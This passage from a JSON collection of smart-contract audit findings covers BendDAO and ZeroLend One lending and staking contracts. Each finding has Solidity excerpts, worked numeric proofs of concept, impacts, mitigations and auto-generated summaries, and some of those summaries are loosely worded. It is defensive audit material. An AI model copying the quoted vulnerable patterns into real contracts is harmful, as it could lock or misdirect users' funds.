`totalUnstakeFine - claimedUnstakeFine` which includes the funds that are not ready to claim.\n```\n\n//src/yield/YieldStakingBase.sol\n    function collectFeeToTreasury() public virtual onlyPoolAdmin {\n        address to = addressProvider.getTreasury();\n        require(to != address(0), Errors.TREASURY_CANNOT_BE_ZERO);\n\n        if (totalUnstakeFine > claimedUnstakeFine) {\n|>          uint256 amountToCollect = totalUnstakeFine - claimedUnstakeFine;\n            claimedUnstakeFine += amountToCollect;\n\n            underlyingAsset.safeTransfer(to, amountToCollect);\n\n            emit CollectFeeToTreasury(to, amountToCollect);\n        }\n    }\n```\n\n[YieldStakingBase.sol# L171](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldStakingBase.sol# L171)\n\nVulnerable cases:\n\n1. tx racing. Since bot is programmed to call `unstake` anytime based on the set condition of unhealthy positions, its unstake tx might settle before a pending `collectFeeToTreasury` by poolAdmin, causing `collectFeeToTreasury` to revert;\n2. No guarantee that the fines can be repaid. When bot can only partially `repay` the staking positions, unstakingFines might not be repaid. It’s up to the user to call repay() to fully cover total debts + fines(`vars.extraAmount`). This causes further uncertainty as to when `totalUnstakeFine` can be available. And if the user is not able to repay, `totalUnstakeFine` will never be recovered. This DOSes `collectFeeToTreasury`.\n\n   \n```\n\n   //src/yield/YieldStakingBase.sol\n   function _repay(uint32 poolId, address nft, uint256 tokenId) internal virtual {\n   ...\n           // compute fine value\n       if (vars.remainAmount >= sd.unstakeFine) {\n           vars.remainAmount = vars.remainAmount - sd.unstakeFine;\n       } else {\n   |>          vars.extraAmount = vars.extraAmount + (sd.unstakeFine - vars.remainAmount);\n       }\n\n       sd.remainYieldAmount = vars.remainAmount;\n\n       // transfer eth from sender exclude bot admin\n   |>     if ((vars.extraAmount > 0) && (msg.sender != botAdmin)) {\n           underlying asset.safeTransferFrom(msg.sender, address(this), vars.extraAmount);\n       }\n   \n```\n\n   [YieldStakingBase.sol# L475-L476](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldStakingBase.sol# L475-L476)\n\n### Impact\n\ncollectFeeToTreasury might face repetitive revert or even DOS. protocol funds can be locked.\n\n### Recommended mitigation steps\n\nConsider only incrementing `totalUnstakFine` in `_repay`. The increment amount is the actual funds that are claimed or covered by the user.\n\n**thorseldon (BendDAO) acknowledged**\n\n---\n\n",
      "summary": "\nThe bug report is about a vulnerability in a code for staking and collecting fees. The issue is that the code tries to transfer funds that are not available, causing it to repeatedly fail. This is due to the fact that a certain amount of funds is being incremented before they are actually available. This can lead to the locking of funds and potential denial of service attacks. It is recommended to only increment the funds when they are actually available. The team has acknowledged the issue and is working on a solution.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-8",
      "tags": [],
      "finders": [
        "oakcobalt",
        "SpicyMeatball"
      ]
    },
    {
      "id": "49594",
      "title": "[M-01] Staked assets can be locked in Lido, due to vulnerable check in `YieldEthStakingLido::protocolDeposit`",
      "impact": "MEDIUM",
      "content": "\n\nCode reference: [YieldEthStakingLido.sol# L85](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/lido/YieldEthStakingLido.sol# L85)\n\n### Finding description and impact\n\nIn Lido’s [WithdrawRequest(WithdrawalQueue.sol) implementation](https://github.com/lidofinance/lido-dao/blob/5fcedc6e9a9f3ec154e69cff47c2b9e25503a78a/contracts/0.8.9/WithdrawalQueue.sol# L395-L400), only a withdraw request with stETH amount within `MIN_STETH_WITHDRAWAL_AMOUNT`, `MAX_STETH_WITHDRAWAL_AMOUNT` ( [100, 1000ether]) can be processed.\n\nIf the yieldAmount exceeds 1000ether, the withdrawal request has to be split into several requests.\n\nThe problem is YiedEthstaingLido::protocolDeposit has a vulnerable check on `MAX_STETH_WITHDRAWAL_AMOUNT`, and will still allow a position to stake more than `MAX_STETH_WITHDRAWAL_AMOUNT` overtime.\n\nSince YieldEthStakingLido.sol doesn’t allow splitting withdrawal of a staking position(yieldStakeData), any staking position exceeding `MAX_STETH_WITHDRAWAL_AMOUNT` cannot be unstaked. Funds will be locked in Lido.\n\n### Proof of Concept\n\nVulnerability: protocolDeposit can be called multiple times through `stake()`, allowing a user to incrementally stake more asset associated the same staked NFT. The check on the max cap through protocolDeposit is invalid because it only check any single stake amount is below the max cap. Multiple stakes can still exceed the max cap.\n```\n\n//src/yield/lido/YieldEthStakingLido.sol\n\n    function protocolDeposit(YieldStakeData storage sd, uint256 amount) internal virtual override returns (uint256) {\n        require(amount >= MIN_STETH_WITHDRAWAL_AMOUNT, Errors.YIELD_ETH_LT_MIN_AMOUNT);\n|>      require(amount <= MAX_STETH_WITHDRAWAL_AMOUNT, Errors.YIELD_ETH_GT_MAX_AMOUNT);\n        ...\n```\n\n[YieldEthStakingLido.sol# L85](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/lido/YieldEthStakingLido.sol# L85)\n```\n\n//src/yield/YieldStakingBase.sol\n\n    function _stake(uint32 poolId, address nft, uint256 tokenId, uint256 borrowAmount) internal virtual {\n...\n        // stake in protocol and got the yield\n        vars.totalYieldBeforeDeposit = getAccountTotalUnstakedYield(address(vars.yieldAccout));\n|>      vars.yieldAmount = protocolDeposit(sd, borrowAmount);\n        vars.yieldShare = _convertToYieldSharesWithTotalYield(\n            address(vars.yieldAccout),\n            vars.yieldAmount,\n            vars.totalYieldBeforeDeposit\n        );\n\n        // update nft shares\n        sd.debtShare += vars.debtShare;\n |>     sd.yieldShare += vars.yieldShare; //@audit-info note: multiple stakes, increment total yieldShare\n...\n```\n\n[YieldStakingBase.sol# L276](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/YieldStakingBase.sol# L276)\n\n### Impact\n\nUnable to unstake, NFT locked and ETH locked in Lido.\n\n### Recommended mitigation steps\n\nConsider moving the max cap check (total yield amount + borrow) into `YieldStakingBase::_stake`. The actual check parameter can be pulled from YieldEthStakingLido.sol.\nFor example,\n```\n\n//src/yield/YieldStakingBase.sol\n\n    function _stake(uint32 poolId, address nft, uint256 tokenId, uint256 borrowAmount) internal virtual {\n...\n        vars.totalYieldBeforeDeposit = getAccountTotalUnstakedYield(address(vars.yieldAccout));\n+       checkMaxStakingCap(vars.totalYieldBeforeDeposit + borrowAmount);\n        vars.yieldAmount = protocolDeposit(sd, borrowAmount);\n...\n```\n\n\n```\n\n//src/yield/lido/YieldEthStakingLido.sol\n\n    function checkMaxStakingCap(uint256 amount ) public pure override{\n        require(amount >= MIN_STETH_WITHDRAWAL_AMOUNT, Errors.YIELD_ETH_LT_MIN_AMOUNT);\n        require(amount <= MAX_STETH_WITHDRAWAL_AMOUNT, Errors.YIELD_ETH_GT_MAX_AMOUNT);\n...\n```\n\n**[thorseldon (BendDAO) acknowledged and commented](https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-6?commentParent=wB3DBuwwPQW):**\n\n> As we implement the new `YieldWUSDStaking` contract, we already know the increment stake issues which should not be supported in any yield contract.\n>\n> But the fix is pending as our frontend only support only 1 stake per NFT for now.\n\n---\n\n",
      "summary": "\nThis bug report highlights a vulnerability in the code of Lido's WithdrawRequest implementation. The issue is that the protocolDeposit function allows for multiple calls through the stake() function, which can result in a user staking more than the maximum allowed amount. This can lead to funds being locked in Lido and the inability to unstake NFTs. The recommended mitigation steps suggest moving the maximum cap check into the _stake function to prevent this issue. The team has acknowledged the problem and is working on a fix.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-6",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "49593",
      "title": "[H-02] `YieldWUSDStaking.repay()` may incorrectly over-refund `remainAmount` to user",
      "impact": "HIGH",
      "content": "\n\nCode reference: [YieldWUSDStaking.sol# L468](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/yield/wusd/YieldWUSDStaking.sol# L468)\n\nIn `YieldWUSDStaking.repay()`, we will calculate the amount that needs to be refunded to the user `remainAmount`:\n```\n\n    function _repay(uint32 poolId, address nft, uint256 tokenId) internal virtual {\n...\n        // compute fine value\n        if (vars.remainAmount >= sd.unstakeFine) {\n            vars.remainAmount = vars.remainAmount - sd.unstakeFine;\n        } else {\n            vars.extraAmount = vars.extraAmount + (sd.unstakeFine - vars.remainAmount);\n@>        // missing clear  vars.remainAmount = 0\n        }\n\n@>      sd.remainYieldAmount = vars.remainAmount;\n...\n\n        // send remain funds to owner\n        if (sd.remainYieldAmount > 0) {\n@>          underlyingAsset.safeTransfer(vars.nftOwner, sd.remainYieldAmount);\n            sd.remainYieldAmount = 0;\n        }\n```\n\nThe problem is that when use call `repay()`, if `vars.remainAmount < sd.unstakeFine`, it doesn’t clear `vars.remainAmount` to 0, which results in a refund to the user, which should be treated as `unstakeFine`.\n\nFor example:\nunstakeFine = 10 , remainAmount = 5\n\nAs currently calculated\n\n1. extraAmount = (unstakeFine - remainAmount ) = 10 - 5 = 5\n2. remainYieldAmount = 5 =====> ( should 0)\n\n### Impact\n\nOver-refund `remainAmount` to user.\n\nAt the same time, it will also cause the contract balance to be insufficient (after `collectFeeToTreasury ()`) and others will not be able to repay.\n\n### Recommended Mitigation\n```\n\n    function _repay(uint32 poolId, address nft, uint256 tokenId) internal virtual {\n...\n        // compute fine value\n        if (vars.remainAmount >= sd.unstakeFine) {\n            vars.remainAmount = vars.remainAmount - sd.unstakeFine;\n        } else {\n            vars.extraAmount = vars.extraAmount + (sd.unstakeFine - vars.remainAmount);\n+           if(msg.sender != botAdmin) {\n+               vars.remainAmount = 0;\n+           }\n        }\n\n        sd.remainYieldAmount = vars.remainAmount;\n...\n\n        // send remain funds to owner\n        if (sd.remainYieldAmount > 0) {\n            underlyingAsset.safeTransfer(vars.nftOwner, sd.remainYieldAmount);\n            sd.remainYieldAmount = 0;\n        }\n```\n\n**[thorseldon (BendDAO) confirmed and commented](https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-12?commentParent=RWrhJBT3fW4):**\n\n> Fixed in [commit 75055c9](https://github.com/BendDAO/bend-v2/commit/75055c907517c4970a2cc7d27e0e6226e366781e)\n\n---\n\n",
      "summary": "\nThe bug is located in the code for the YieldWUSDStaking contract, specifically in the _repay() function at line 468. If the user's remaining amount (remainAmount) is less than the unstakeFine, the code does not set remainAmount to 0, resulting in an over-refund to the user. This can cause issues with the contract's balance and prevent others from repaying. To fix this, the code should be modified to set remainAmount to 0 if the user is not the botAdmin. This issue has been confirmed and fixed by the BendDAO team in commit 75055c9.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-12",
      "tags": [],
      "finders": [
        "bin2chen",
        "oakcobalt",
        "SpicyMeatball"
      ]
    },
    {
      "id": "49592",
      "title": "[H-01] `executeIsolateLiquidate()` `totalBidAmout/availableLiquidity` incorrect accounting",
      "impact": "HIGH",
      "content": "\n\nCode reference: [IsolateLogic.sol# L499](https://github.com/code-423n4/2024-12-benddao/blob/489f8dd0f8e86e5a7550cc6b81f9edfe79efbf4e/src/libraries/logic/IsolateLogic.sol# L499)\n\nWhen `executeIsolateLiquidate()` is executed, it will account `totalBidAmout/availableLiquidity`.\n\nThe main accounting code is as follows:\n```\n\n    function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {\n...\n\n        InterestLogic.updateInterestRates(poolData, debtAssetData, vars.totalBorrowAmount, 0);\n\n        if (vars.totalExtraAmount > 0) {\n            // transfer underlying asset from caller to pool\n@>          VaultLogic.erc20TransferInLiquidity(debtAssetData, params.msgSender, vars.totalExtraAmount);\n        }\n\n        // bid already in pool and now repay the borrow but need to increase liquidity\n@>      VaultLogic.erc20TransferOutBidAmountToLiqudity(debtAssetData, vars.totalBorrowAmount);\n\n        // transfer erc721 to winning bidder\n        if (params.supplyAsCollateral) {\n            VaultLogic.erc721TransferIsolateSupplyOnLiquidate(\n                nftAssetData,\n                vars.winningBidder,\n                params.nftTokenIds,\n                true\n            );\n        } else {\n            VaultLogic.erc721DecreaseIsolateSupplyOnLiquidate(nftAssetData, params.nftTokenIds);\n\n            VaultLogic.erc721TransferOutLiquidity(nftAssetData, vars.winningBidder, params.nftTokenIds);\n        }\n\nfunction erc20TransferInLiquidity(DataTypes.AssetData storage assetData, address from, uint256 amount) internal {\n        address asset = assetData.underlyingAsset;\n        uint256 poolSizeBefore = IERC20Upgradeable(asset).balanceOf(address(this));\n\n@>      assetData.availableLiquidity += amount;\n\n        IERC20Upgradeable(asset).safeTransferFrom(from, address(this), amount);\n\n        uint256 poolSizeAfter = IERC20Upgradeable(asset).balanceOf(address(this));\n        require(poolSizeAfter == (poolSizeBefore + amount), Errors.INVALID_TRANSFER_AMOUNT);\n    }\n\n    function erc20TransferOutBidAmountToLiqudity(DataTypes.AssetData storage assetData, uint amount) internal {\n        require(assetData.totalBidAmout >= amount, Errors.ASSET_INSUFFICIENT_BIDAMOUNT);\n@>      assetData.totalBidAmout -= amount;\n\n@>      assetData.availableLiquidity += amount;\n    }\n```\n\nWe know from the above code that the current formula is as follows:\n\n1. availableLiquidity += (totalBorrowAmount + totalExtraAmount)\n2. totalBidAmout -= totalBorrowAmount\n\nBoth of these accounting errors. TotalExtraAmount is calculated twice.totalBorrowAmount already contains totalExtraAmount.\n\nExample:\nSuppose: total Borrow Amount = 100 , Actual Bid Amout = 80\nSo: total Extra Amount = 20\n\nbut in the current algorithm:\n\n1. availableLiquidity += (totalBorrowAmount + totalExtraAmount) = 100 + 20 = 120\n2. totalBidAmout -= totalBorrowAmount = 100\n\nThe correct value is:\n\n1. availableLiquidity += totalBorrowAmount = 100\n2. totalBidAmout -= (totalBorrowAmount - totalExtraAmount) = (100 - 20) = 80\n\n### Impact\n\n1. availableLiquidity adds extra totalExtraAmount, resulting in inaccurate borrowRate.\n2. totalBidAmout underflow, which makes it impossible to liquidate.\n\n### Recommended Mitigation\n```\n\n    function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {\n...\n\n        InterestLogic.updateInterestRates(poolData, debtAssetData, vars.totalBorrowAmount, 0);\n\n        if (vars.totalExtraAmount > 0) {\n            // transfer underlying asset from caller to pool\n            VaultLogic.erc20TransferInLiquidity(debtAssetData, params.msgSender, vars.totalExtraAmount);\n        }\n\n        // bid already in pool and now repay the borrow but need to increase liquidity\n-       VaultLogic.erc20TransferOutBidAmountToLiqudity(debtAssetData, vars.totalBorrowAmount);\n+       VaultLogic.erc20TransferOutBidAmountToLiqudity(debtAssetData, vars.totalBorrowAmount - vars.totalExtraAmount );\n```\n\n**[thorseldon (BendDAO) confirmed and commented](https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-4?commentParent=sLDn7dmwQPF):**\n\n> Fixed in [commit 18a4b84](https://github.com/BendDAO/bend-v2/commit/18a4b84b51d2381e60e5c2ca9053186f9ca41637)\n\n---\n\n",
      "summary": "\nThis bug report discusses a potential issue in the code for the BendDAO project. The specific code causing the issue can be found at line 499 in the IsolateLogic.sol file. When the function \"executeIsolateLiquidate()\" is executed, it will account for \"totalBidAmount/availableLiquidity\". However, the current formula used in the code is incorrect and results in inaccurate values for availableLiquidity and totalBidAmount. This can have a negative impact on the project, as it can lead to an incorrect borrow rate and make it impossible to liquidate. The recommended mitigation is to make a small change to the code in order to fix the formula and prevent these issues. The fix has already been implemented in the project's code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-12-benddao-invitational",
      "github_link": "https://code4rena.com/audits/2024-12-benddao-invitational/submissions/F-4",
      "tags": [
        "Liquidation"
      ],
      "finders": [
        "bin2chen",
        "1",
        "2"
      ]
    },
    {
      "id": "41836",
      "title": "M-15: The repayment process in the NFTPositionManager can sometimes be reverted",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/488 \n\n## Found by \nObsidian, dany.armstrong90, ether\\_sky\n## Summary\nUsers can `supply` `assets` to the `pools` through the `NFTPositionManager` to earn `rewards` in  `zero` tokens. \nFunctions like `deposit`, `withdraw`, `repay`, and `borrow` should operate normally. \nHowever, due to an additional check, `repayments` might be reverted.\n## Vulnerability Detail\nHere's the relationship between `shares` (`s`) and `assets` (`a`) in the `Pool`:\n-  **Share to Asset Conversion:**\n   `a = [(s * I + 10^27 / 2) / 10^27] (rayMul)`\n```solidity\nfunction rayMul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n  assembly {\n    if iszero(or(iszero(b), iszero(gt(a, div(sub(not(0), HALF_RAY), b))))) { revert(0, 0) }\n    c := div(add(mul(a, b), HALF_RAY), RAY)\n  }\n}\n```\n- **Asset to Share Conversion:**\n    `s = [(a * 10^27 + I / 2) / I] (rayDiv)`\n```solidity\nfunction rayDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {\n  assembly {\n    if or(iszero(b), iszero(iszero(gt(a, div(sub(not(0), div(b, 2)), RAY))))) { revert(0, 0) }\n    c := div(add(mul(a, RAY), div(b, 2)), b)\n  }\n}\n```\n\n**Numerical Example:**\nSuppose there is a `pool` `P` where users `borrow` `assets` `A` using the `NFTPositionManager`.\n- The current `borrow index` of `P` is `2 * 10^27`, and the `share` is `5`.\n- The `previous debt balance` is as below (`Line 119`):\n    `previousDebtBalance = [(s * I + 10^27 / 2) / 10 ^27] = [(5 * 2 * 10^27 + 10^27 / 2) / 10^27] = 10`\n- If we are going to `repay` `3` `assets`:\n    - The removed `shares` is:\n        `[(a * 10^27 + I / 2) / I] = [(3 * 10^27 + 2 * 10^27 / 2) / (2 * 10^27)] = 2`\n    - Therefore, the remaining `share` is:\n        `5 - 2 = 3`\n- The `current debt balance` is as below  (`Line 121`):\n    `currentDebtBalance = [(s * I + 10^27 / 2) / 10 ^27] = [(3 * 2 * 10^27 + 10^27 / 2) / 10^27 = 6`\nThen in `line 123`, `previousDebtBalance - currentDebtBalance` would be `4` and `repaid.assets` is `3`.\nAs a result, the `repayment` would be reverted.\n```solidity\nfunction _repay(AssetOperationParams memory params) internal nonReentrant {\n119:  uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n\n  DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n\n121:  uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n  \n123:  if (previousDebtBalance - currentDebtBalance != repaid.assets) {\n    revert NFTErrorsLib.BalanceMisMatch();\n  }\n}\n```\nThis example demonstrates a `potential 1 wei mismatch` between `previousDebtBalance` and `currentDebtBalance` due to rounding in the calculations.\n## Impact\nThis check seems to cause a `denial-of-service (DoS)` situation where `repayments` can fail due to small rounding errors. \nThis issue can occur with various combinations of `borrow index`, `share amounts`, and `repaid assets`.\n## Code Snippet\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/WadRayMath.sol#L77\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/utils/WadRayMath.sol#L93\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119-L125\n## Tool used\n\nManual Review\n\n## Recommendation\nEither remove this check or adjust it to allow a `1 wei mismatch` to prevent unnecessary reversion of `repayments`.",
      "summary": "\nThe NFTPositionManager has a bug where the repayment process can sometimes be reversed. This means that users who supply assets to the pools to earn rewards in zero tokens may have their repayments fail due to a small rounding error. This can cause a denial-of-service situation where repayments fail. The bug was found by Obsidian, dany.armstrong90, and ether_sky. The code for the conversion between shares and assets is causing the issue and needs to be adjusted to allow for a small mismatch to prevent unnecessary reversions. The recommendation is to either remove the check or adjust it to allow for a 1 wei mismatch. The bug was found through manual review and can occur with various combinations of borrow index, share amounts, and repaid assets.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/488",
      "tags": [],
      "finders": [
        "Obsidian",
        "ether\\_sky",
        "dany.armstrong90"
      ]
    },
    {
      "id": "41835",
      "title": "M-14: NFTPositionManager's `repay()` and `repayETH()` are unavailable unless preceded atomically by an accounting updating operation",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/467 \n\n## Found by \n000000, A2-security, JCN, Obsidian, denzi\\_, hyh, stuart\\_the\\_minion, thisvishalsingh, zarkk01\n### Summary\n\nThe check in `_repay()` cannot be satisfied if pool state was not already updated by some other operation in the same block. This makes any standalone `repay()` and `repayETH()` calls revert, i.e. core repaying functionality can frequently be unavailable for end users since it's not packed with anything by default in production usage\n\n### Root Cause\n\n\nPool state wasn't updated before `previousDebtBalance` was set:\n\n[NFTPositionManager.sol#L115-L128](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManager.sol#L115-L128)\n\n```solidity\n  /// @inheritdoc INFTPositionManager\n  function repay(AssetOperationParams memory params) external {\n    if (params.asset == address(0)) revert NFTErrorsLib.ZeroAddressNotAllowed();\n    IERC20Upgradeable(params.asset).safeTransferFrom(msg.sender, address(this), params.amount);\n>>  _repay(params);\n  }\n\n  /// @inheritdoc INFTPositionManager\n  function repayETH(AssetOperationParams memory params) external payable {\n    params.asset = address(weth);\n    if (msg.value != params.amount) revert NFTErrorsLib.UnequalAmountNotAllowed();\n    weth.deposit{value: params.amount}();\n>>  _repay(params);\n  }\n```\n\n[NFTPositionManagerSetters.sol#L105-L121](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L105-L121)\n\n```solidity\n  function _repay(AssetOperationParams memory params) internal nonReentrant {\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    Position memory userPosition = _positions[params.tokenId];\n\n    IPool pool = IPool(userPosition.pool);\n    IERC20 asset = IERC20(params.asset);\n\n    asset.forceApprove(userPosition.pool, params.amount);\n\n>>  uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n>>  uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n```\n\n[PoolGetters.sol#L94-L97](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/PoolGetters.sol#L94-L97)\n\n```solidity\n  function getDebt(address asset, address who, uint256 index) external view returns (uint256 debt) {\n    bytes32 positionId = who.getPositionId(index);\n>>  return _balances[asset][positionId].getDebtBalance(_reserves[asset].borrowIndex);\n  }\n```\n\nBut it was updated in `pool.repay()` before repayment workflow altered the state:\n\n[BorrowLogic.sol#L117-L125](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/BorrowLogic.sol#L117-L125)\n\n```solidity\n  function executeRepay(\n    ...\n  ) external returns (DataTypes.SharesType memory payback) {\n    DataTypes.ReserveCache memory cache = reserve.cache(totalSupplies);\n>>  reserve.updateState(params.reserveFactor, cache);\n```\n\n[ReserveLogic.sol#L87-L95](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L87-L95)\n\n```solidity\n  function updateState(DataTypes.ReserveData storage self, uint256 _reserveFactor, DataTypes.ReserveCache memory _cache) internal {\n    // If time didn't pass since last stored timestamp, skip state update\n    if (self.lastUpdateTimestamp == uint40(block.timestamp)) return;\n\n>>  _updateIndexes(self, _cache);\n    _accrueToTreasury(_reserveFactor, self, _cache);\n\n    self.lastUpdateTimestamp = uint40(block.timestamp);\n  }\n```\n\n[ReserveLogic.sol#L220-L238](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L220-L238)\n\n```solidity\n  function _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {\n    ...\n    if (_cache.currDebtShares != 0) {\n      uint256 cumulatedBorrowInterest = MathUtils.calculateCompoundedInterest(_cache.currBorrowRate, _cache.reserveLastUpdateTimestamp);\n      _cache.nextBorrowIndex = cumulatedBorrowInterest.rayMul(_cache.currBorrowIndex).toUint128();\n>>    _reserve.borrowIndex = _cache.nextBorrowIndex;\n    }\n```\n\nThis way the `previousDebtBalance - currentDebtBalance` consists of state change due to the passage of time since last update and state change due to repayment:\n\n[NFTPositionManagerSetters.sol#L105-L125](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L105-L125)\n\n```solidity\n  function _repay(AssetOperationParams memory params) internal nonReentrant {\n    if (params.amount == 0) revert NFTErrorsLib.ZeroValueNotAllowed();\n    if (params.tokenId == 0) {\n      if (msg.sender != _ownerOf(_nextId - 1)) revert NFTErrorsLib.NotTokenIdOwner();\n      params.tokenId = _nextId - 1;\n    }\n\n    Position memory userPosition = _positions[params.tokenId];\n\n    IPool pool = IPool(userPosition.pool);\n    IERC20 asset = IERC20(params.asset);\n\n    asset.forceApprove(userPosition.pool, params.amount);\n\n    uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n    DataTypes.SharesType memory repaid = pool.repay(params.asset, params.amount, params.tokenId, params.data);\n    uint256 currentDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n\n>>  if (previousDebtBalance - currentDebtBalance != repaid.assets) {\n      revert NFTErrorsLib.BalanceMisMatch();\n    }\n```\n\n`previousDebtBalance` can be stale and, in general, it is `previousDebtBalance - currentDebtBalance = (actualPreviousDebtBalance - currentDebtBalance) - (actualPreviousDebtBalance - previousDebtBalance) = repaid.assets - {debt growth due to passage of time since last update} < repaid.assets`, where `actualPreviousDebtBalance` is `pool.getDebt()` result after `reserve.updateState()`, but before repayment\n\n### Internal pre-conditions\n\nInterest rate and debt are positive, so there is some interest accrual happens over time. This is normal (going concern) state of any pool\n\n### External pre-conditions\n\nNo other state updating operations were run since the last block\n\n### Attack Path\n\nNo direct attack needed in this case, a protocol malfunction causes loss to some users\n\n### Impact\n\nCore system functionality, `repay()` and `repayETH()`, are unavailable whenever aren't grouped with other state updating calls, which is most of the times in terms of the typical end user interactions. Since the operation is time sensitive and is typically run by end users directly, this means that there is a substantial probability that unavailability in this case leads to losses, e.g. a material share of NFTPositionManager users cannot repay in time and end up being liquidated as a direct consequence of the issue (i.e. there are other ways to meet the risk, but time and investigational effort are needed, while liquidations will not wait).\n\nOverall probability is medium: interest accrues almost always and most operations are stand alone (cumulatively high probability) and repay is frequently enough called close to liquidation (medium probability). Overall impact is high: loss is deterministic on liquidation, is equal to liquidation penalty and can be substantial in absolute terms for big positions. The overall severity is high\n\n### PoC\n\nA user wants and can repay the debt that is about to be liquidated, but all the repayment transactions revert, being done straightforwardly at a stand alone basis, meanwhile the position is liquidated, bearing the corresponding penalty as net loss\n\n### Mitigation\n\nConsider adding direct reserve update before reading from the state, e.g.:\n\n[NFTPositionManagerSetters.sol#L119](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/positions/NFTPositionManagerSetters.sol#L119)\n\n```diff\n+   pool.forceUpdateReserve(params.asset);\n    uint256 previousDebtBalance = pool.getDebt(params.asset, address(this), params.tokenId);\n```\n\n\n\n\n## Discussion\n\n**0xjuaan**\n\nshouldn't this be high severity because the only way to retrieve the stuck funds would be for each individual user to somehow atomically update the interest rate before repayment?\n\n**Haxatron**\n\nEscalate\n\nFinal time to use this \n\n**sherlock-admin3**\n\n> Escalate\n> \n> Final time to use this \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThis is the High severity rule:\n\n> Definite loss of funds without (extensive) **limitations of external conditions**. The loss of the affected party must exceed 1%.\n\nMedium: \n\n> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.\n> Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.\n\nWe can see that in this issue, we have no loss of funds without any constrains.\n\nThe main impact is that the `repay()` functionality may not work in certain circumstances, and more matches the rule for Medium severity. : `Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party`.\n\nPlanning to reject the escalation and leave the issue as is.\n\n\n\n**0xjuaan**\n\n@cvetanovv \n\nThe reason why it's high severity is that 